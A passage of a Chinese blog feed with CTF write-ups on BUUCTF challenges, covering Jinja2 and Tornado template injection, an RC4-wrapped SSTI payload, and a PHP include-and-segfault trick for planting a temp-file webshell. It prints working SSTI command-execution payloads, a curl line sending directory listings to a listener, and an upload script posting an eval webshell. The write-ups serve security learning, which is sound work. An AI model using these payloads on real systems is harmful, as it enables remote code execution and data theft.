lipsum.__globals__.__builconfigtins__.__impoconfigrt__('oconfigs').poconfigpen('whoami').read()%&#125;</code></pre><p>因为<code>config</code>字符串是在黑名单的最后一个，所以黑名单中前面字符串的过滤都已经结束了，再进行<code>config</code>的过滤，但是过滤完<code>config</code>之后才会出现黑名单中前面的字符串，因此可以绕过。</p><p>第三种方法，不用print，使用curl外带</p><pre><code class="python">&#123;% iconfigf ''.__claconfigss__.__mrconfigo__[2].__subclaconfigsses__()[59].__init__.func_gloconfigbals.linecconfigache.oconfigs.popconfigen('curl http://127.0.0.1:2333/ -d `ls /|base64`') %&#125;1&#123;% endiconfigf %&#125;</code></pre><p>vps监听2333端口即可</p><h3 id="CISCN2019-总决赛-Day1-Web3-Flask-Message-Board"><a href="#CISCN2019-总决赛-Day1-Web3-Flask-Message-Board" class="headerlink" title="[CISCN2019 总决赛 Day1 Web3]Flask Message Board"></a>[CISCN2019 总决赛 Day1 Web3]Flask Message Board</h3><p>Fuzz了一波，发现这里无论输入什么都会提示被拒绝，但是<code>Title</code>、<code>Author</code>和<code>Content</code>里面输入<code>1+1</code>就不会，并且回显的是<code>Author</code>的内容。</p><p>那么我们尝试一下，让title和content里的内容为1+1，Author输出我们需要的值</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226161218167.png" alt="image-20220226161218167"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226161227059.png" alt="image-20220226161227059"></p><p>我们发现了一个好玩的东西</p><pre><code class="html">&#39;SECRET_KEY&#39;: &#39;ill|111|IIlI1lI|I1i|IiliIIli||i1|l||i1il&#39;</code></pre><p>有了这个我们可以来伪造session</p><p>我们抓下包看看</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226161500978.png" alt="image-20220226161500978"></p><p>对seesion解密</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220226161529089.png" alt="image-20220226161529089"></p><p>发现 “admin”:false  猜测要伪造admin</p><p>使用flask-unsign</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227145626791.png" alt="image-20220227145626791"></p><p>成功访问/admin</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227145809505.png" alt="image-20220227145809505"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227145856114.png" alt="image-20220227145856114"></p><p>看一下</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227150134900.png" alt="image-20220227150134900"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227150430998.png" alt="image-20220227150430998"></p><p>源码是随机显示一部分，但是好在位置固定，通过脚本复原即可：</p><pre><code class="python">import requestsurl = &#39;http://8567734a-8c12-4f70-bfee-6f10e978f956.node3.buuoj.cn/admin/source_thanos&#39;r = requests.get(url)source = r.textfor j in range(10):    r = requests.get(url)    for i in range(len(source)):        if source[i].isspace():            source = source[:i] + r.text[i] + source[i+1:]print(source)</code></pre><p>是和tensorflow有关</p><p>不了解tensorflow，看官方wp：</p><p>通过tensorflow运行下面代码，</p><table><thead><tr><th><code>1 2 3 4 5 6 7 8 9 10 11 12</code></th><th><code>import tensorflow as tf # Tensorboard可视化 def init(model_path):    new_sess = tf.Session()    meta_file = model_path + &quot;.meta&quot;    model = model_path    saver = tf.train.import_meta_graph(meta_file)    saver.restore(new_sess, model)    return new_sess sess = init(&#39;detection_model/detection&#39;) writer = tf.summary.FileWriter(&quot;./log&quot;, sess.graph) # 然后在命令行执行tensorboard --logdir ./log </code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>在对应端口查看图结构，发现当输入的字符串字符总和为1024时会触发读取<code>/flag</code>的后门，此时转向处理输入的函数：</p><p>复制</p><table><thead><tr><th><code>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16</code></th><th><code>def predict(sess, x):    &#39;&#39;&#39;    :param x: input number x        sess: tensorflow session    :return: b&#39;You are: *&#39;    &#39;&#39;&#39;    y = sess.graph.get_tensor_by_name(&quot;y:0&quot;)    y_out = sess.run(y, &#123;&quot;x:0&quot;: x&#125;)    return y_out def check_bot(input_str):    r = predict(sess, sum(map(ord, input_str)))    return r if isinstance(r, str) else r.decode() # check_result = check_bot(content) # check_bot函数只处理了输入框接收的内容，因此只有输入框可以触发读取</code>/flag<code>的后门。 </code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>这里<strong>将输入的字符串转化为ASCII码然后求和作为x的值</strong>，需要将x的值改为1024，于是构造一个ASCII码值和为1024的字符串赋值x：</p><blockquote><p>aaaaaabxCZC</p></blockquote><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227152804895.png" alt="image-20220227152804895"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227152731787.png" alt="image-20220227152731787"></p><h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227161912581.png" alt="image-20220227161912581"></p><p>当文件名和filehash不匹配，会报错</p><pre><code class="html">http://f9bce56c-7ea3-4a3e-8c9e-48df6af87351.node4.buuoj.cn:81/error?msg=Error</code></pre><p>猜测msg可控，测试tornado模板注入</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227162403996.png" alt="image-20220227162403996"></p><p>来了个orz？？</p><p>还是去搜资料吧</p><p>在tornado模板中，存在一些可以访问的快速对象，比如 <code>&#123;&#123;escape(handler.settings["cookie"])&#125;&#125;</code>，这个其实就是handler.settings对象，里面存储着一些环境变量，具体分析请参照《<a href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html">python SSTI tornado render模板注入</a>》。</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227162508416.png" alt="image-20220227162508416"></p><p>直接爆出来了cookie_secret</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227162618736.png" alt="image-20220227162618736"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227162629687.png" alt="image-20220227162629687"></p><p>可以推算出filehash的值</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227163147952.png" alt="image-20220227163147952"></p><h3 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h3><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227163739351.png" alt="image-20220227163739351"></p><p>里面只有这个，盲猜目录  xxx/secret</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227163835456.png" alt="image-20220227163835456"></p><p>猜测存在参数secret</p><p>随便输入</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227163930104.png" alt="image-20220227163930104"></p><p>报错，寻找可用信息</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227164006319.png" alt="image-20220227164006319"></p><p>发现会对输入的值进行rc4解密</p><p>放一个RC4加密脚本</p><pre><code class="python">import base64from urllib.parse import quotedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):    # print(&quot;RC4加密主函数&quot;)    s_box = rc4_init_sbox(key)    crypt = str(rc4_excrypt(message, s_box))    return  cryptdef rc4_init_sbox(key):    s_box = list(range(256))  # 我这里没管秘钥小于256的情况，小于256不断重复填充即可    # print(&quot;原来的 s 盒：%s&quot; % s_box)    j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    # print(&quot;混乱后的 s 盒：%s&quot;% s_box)    return s_boxdef rc4_excrypt(plain, box):    # print(&quot;调用加密程序成功。&quot;)    res = []    i = j = 0    for s in plain:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(chr(ord(s) ^ k))    # print(&quot;res用于加密字符串，加密后是：%res&quot; %res)    cipher = &quot;&quot;.join(res)    print(&quot;加密后的字符串是：%s&quot; %quote(cipher))    #print(&quot;加密后的输出(经过编码):&quot;)    #print(str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))    return (str(base64.b64encode(cipher.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;))rc4_main(&quot;HereIsTreasure&quot;,&quot;&#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()&#125;&#125;&quot;)</code></pre><p>可得payload：</p><pre><code class="html">.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220227164255493.png" alt="image-20220227164255493"></p><h3 id="RootersCTF2019-I-lt-3-Flask-用name注入"><a href="#RootersCTF2019-I-lt-3-Flask-用name注入" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask 用name注入"></a>[RootersCTF2019]I_&lt;3_Flask 用name注入</h3><h4 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p>这道题是模板注入。</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211102608147.png" alt="image-20220211102608147"></p><p>首先查看源代码，并没有什么用。</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211102910418.png" alt="image-20220211102910418"></p><p>dirsearch爆破一下，什么也没有。</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211102929099.png" alt="image-20220211102929099"></p><p>本题是flask类题目，ctf常考点不过就是模板注入，所以我们需要寻找可注入参数，本地并没有给出，需要我们自己去爆破。</p><p>我们这里采用arjun工具进行爆破。工具链接：<a href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211110028885.png" alt="image-20220211110028885">最终可爆破出来参数name。</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211105238512.png" alt="image-20220211105238512"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211105250064.png" alt="image-20220211105250064"></p><p>测试了一下的确存在模板注入。</p><p>接下来就是对漏洞的利用。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="工具tplmap"><a href="#工具tplmap" class="headerlink" title="工具tplmap"></a>工具tplmap</h5><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211110242684.png" alt="image-20220211110242684"></p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211110254561.png" alt="image-20220211110254561"></p><p>成功，发现为Jinja2模板，在ctf题目中经常考察</p><p>直接–os-shell拿下shell，读取flag</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211110436293.png" alt="image-20220211110436293"></p><h4 id="手工利用"><a href="#手工利用" class="headerlink" title="手工利用"></a>手工利用</h4><p>只会工具当然不行，有时候工具无法成功，就需要自己手动测试，所以如何手撸也是需要掌握的。</p><p>具体可参考这篇文章，东西很多且杂，写给自己看的大佬别喷我。</p><p><a href="https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/">https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/</a></p><p>首先给几个比较通用的payload</p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211111654284.png" alt="image-20220211111654284"></p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211111724780.png" alt="image-20220211111724780"></p><p>然后我们再讲一讲自己如何撸出来一个payload，做法就是寻找可利用的类。</p><p>1、有popen()的类</p><pre><code>os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>2、有os模块的</p><p>socket._socketobject（一般在71）、site._Printer等模块</p><pre><code>payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>3、有builtins的类</p><p>__ builtins __代码执行（最常用的方法）</p><p>warnings.catch_warnings含有,常用的还有email.header._ValueFormatter</p><p>__ builtins __  是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__ builtins  __ 这类模块在Python启动时为我们导入了，可以使用dir(__ builtins __ )来查看调用方法的列表，然后可以发现__  builtins __ 下有eval，__ import __等的函数，因此可以利用此来执行命令。</p><p>好了，接下来进行实践。</p><p>我们把所有子类列出来</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112131255.png" alt="image-20220211112131255"></p><p>好家伙出来了很多啊，我们只需要找到我们需要的就好，我们用python脚本跑一下</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>我们先来找下os._wrap_close</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112532522.png" alt="image-20220211112532522"></p><p>已经出来了在132位，那么我们就可以构造一个payload</p><pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>我们来测试一下是否可以</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112709595.png" alt="image-20220211112709595"></p><p>成功列出来了文件。</p><p>直接读取flag</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112747491.png" alt="image-20220211112747491"></p><p>同理，可以利用的类还有很多啊，</p><p><img src="/2022/02/27/BUU-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E5%88%B7%E9%A2%98/image-20220211112931751.png" alt="image-20220211112931751"></p><p>就像这个类也在里面包含着，我们同样可以利用它来获取flag。</p><p>方法有很多，理解原理并掌握其中几种方法即可。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;SSTI：&quot;&gt;&lt;a href=&quot;#SSTI：&quot; class=&quot;headerlink&quot; title=&quot;SSTI：&quot;&gt;&lt;/a&gt;SSTI：&lt;/h2&gt;&lt;h2 id=&quot;目录&quot;&gt;&lt;a href=&quot;#目录&quot; class=&quot;headerlink&quot; title=&quot;目录&quot;&gt;&lt;/a&gt;目</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="模板注入" scheme="https://sakurahack-y.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>NPUCTF2020 ezinclude_0x90-0x9F</title>
    <link href="https://sakurahack-y.github.io/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/"/>
    <id>https://sakurahack-y.github.io/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/</id>
    <published>2022-02-13T04:37:09.000Z</published>
    <updated>2022-02-13T06:09:08.453Z</updated>
    
    <content type="html"><![CDATA[<p>最近看了下一些大佬的博客，被打击到了，要学习的有太多了，加油吧！</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124200210.png" alt="image-20220213124200210"></p><p>进去直接来个错误？？？WTF?</p><p>看下源码</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124258414.png" alt="image-20220213124258414"></p><p>疑似哈希长度拓展攻击，抓下包看看</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124348253.png" alt="image-20220213124348253"></p><p>芜湖，hash直接给我了？</p><p>直接传好像不太行?</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124718726.png" alt="image-20220213124718726"></p><p>祭出神器burp</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124626306.png" alt="image-20220213124626306"></p><p>得到文件名 flflflflag.php</p><p>访问一下文件:</p><p>得到如下response</p><pre><code class="html">HTTP/1.1 200 OKServer: openrestyDate: Sun, 13 Feb 2022 04:47:35 GMTContent-Type: text/html; charset=UTF-8Content-Length: 241Connection: closeVary: Accept-EncodingX-Powered-By: PHP/7.0.33&lt;html&gt;&lt;head&gt;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;           window.location.href=&quot;404.html&quot;;&lt;/script&gt;&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;&lt;/head&gt;&lt;&gt;&lt;body&gt;include($_GET[&quot;file&quot;])&lt;/body&gt;&lt;/html&gt;</code></pre><p>我已经有了女朋友所以我比出题人强(手动狗头)</p><p>include 函数好家伙，文件包含应该有了</p><p>来读取下源码</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213125612027.png" alt="image-20220213125612027"></p><p>解码如下:</p><pre><code class="php">&lt;?php$file=$_GET[&#39;file&#39;];if(preg_match(&#39;/data|input|zip/is&#39;,$file))&#123;    die(&#39;nonono&#39;);&#125;@include($file);echo &#39;include($_GET[&quot;file&quot;])&#39;;?&gt;</code></pre><p>过滤了很多东西，没法命令执行了。</p><p>那就扫一下目录把:</p><p>最终扫出来了一个</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213131840887.png" alt="image-20220213131840887"></p><p>这个目录应该是告诉我们文件的名字，来结合文件包含使用。所以我们就要尝试去传shell</p><p>可以用php7 segment fault特性</p><blockquote><p>向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p></blockquote><p>参考链接；<a href="https://www.cnblogs.com/linuxsec/articles/11278477.html">https://www.cnblogs.com/linuxsec/articles/11278477.html</a></p><p>使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell。这里我们可以直接知道文件名就不需要爆破了</p><p>该方法仅适用于以下php7版本，php5并不存在该崩溃：</p><pre><code>• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</code></pre><p>payload</p><pre><code class="php">php &lt; 7.2php://filter/string.strip_tags/resource=/etc/passwdphp7 老版本通杀php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</code></pre><p>由于tmp目录一般是不可访问的，所以该漏洞常常和文件包含结合起来使用</p><p>exp如下:</p><pre><code class="python">import requestsfrom io import BytesIOurl=&quot;http://ec8f0167-007a-4dd5-84fc-989e567ab77c.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;payload=&quot;&lt;?php @eval($_POST[&#39;x&#39;]);?&gt;&quot;files=&#123;    &quot;file&quot;:BytesIO(payload.encode())&#125;r=requests.post(url=url,files=files,allow_redirects=False)print(r.text)</code></pre><p>运行</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213134031132.png" alt="image-20220213134031132"></p><p>这里多了一个文件</p><p>使用蚁剑连接</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213135012413.png" alt="image-20220213135012413"></p><p>测试成功了，但是无法添加，，莫名的错误</p><p>同理那就再添加个phpinfo吧</p><p><img src="/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213135404774.png" alt="image-20220213135404774"></p><p>成功找到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近看了下一些大佬的博客，被打击到了，要学习的有太多了，加油吧！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/02/13/NPUCTF2020-ezinclude-0x90-0x9F/image-20220213124200210.png&quot; alt=&quot;image-2022</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="代码\命令执行类" scheme="https://sakurahack-y.github.io/tags/%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>红明谷CTF 2021 write_shell_0x81-0x8F</title>
    <link href="https://sakurahack-y.github.io/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/"/>
    <id>https://sakurahack-y.github.io/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/</id>
    <published>2022-02-12T02:43:03.000Z</published>
    <updated>2022-02-12T03:24:39.016Z</updated>
    
    <content type="html"><![CDATA[<p>这道题属于比较简单的，让我们来看一下源码</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212104506611.png" alt="image-20220212104506611"></p><p>当我们在后缀加上?action=pwd 就可以得到路径</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212104652393.png" alt="image-20220212104652393"></p><p>再换成upload就可以写文件</p><p>?action=upload&amp;date=xxx</p><p>这道题考察的就是shell的写入，但是它过滤了不少关键词</p><p>其中过滤了php这个关键词，但是这个可以进行绕过</p><pre><code>PHP中有两种短标签，&lt;??&gt;和&lt;?=?&gt;。其中，&lt;??&gt;相当于对&lt;?php&gt;的替换。而&lt;?=?&gt;则是相当于&lt;? echo&gt;大部分文章说短标签需要在php.ini中设置short_open_tag为on才能开启短标签(默认是开启的，但似乎又默认注释，所以还是等于没开启)。但实际上在PHP5.4以后，无论short_open_tag是否开启，&lt;?=?&gt;这种写法总是适用的，&lt;??&gt;这种写法则需要short_open_tag开启才行。</code></pre><p>PHP中，反引号可以起到命令执行的效果</p><p>空格可以用url编码绕过%09</p><p>由这个我们就可以构造出payload</p><pre><code>?action=upload&amp;data=&lt;?=%09`whoami`?&gt;</code></pre><p>访问文件</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212110632709.png" alt="image-20220212110632709"></p><p>成功执行了命令</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212111111008.png" alt="image-20220212111111008"></p><p>直接获取根目录所有文件信息，访问文件，获得flag</p><p><img src="/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212111030856.png" alt="image-20220212111030856"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这道题属于比较简单的，让我们来看一下源码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2022/02/12/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell-0x81-0x8F/image-20220212104506611.png&quot; </summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="writeshell" scheme="https://sakurahack-y.github.io/tags/writeshell/"/>
    
  </entry>
  
  <entry>
    <title>计算机组成原理</title>
